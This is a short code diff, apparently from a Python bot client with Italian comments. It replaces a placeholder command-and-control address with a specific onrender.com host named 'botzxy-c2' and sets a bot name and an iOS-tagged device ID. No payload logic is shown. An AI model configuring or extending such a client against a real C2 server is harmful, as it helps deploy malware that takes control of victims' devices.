@@ -10,7 +10,7 @@ import subprocess
 from datetime import datetime
 
 # Configurazione
-C2_URL = "https://tuo-app.onrender.com"  # SOSTITUISCI
+C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
 DEVICE_ID = os.uname().nodename + "_ios"
 BOT_NAME = "BotZXY"
 
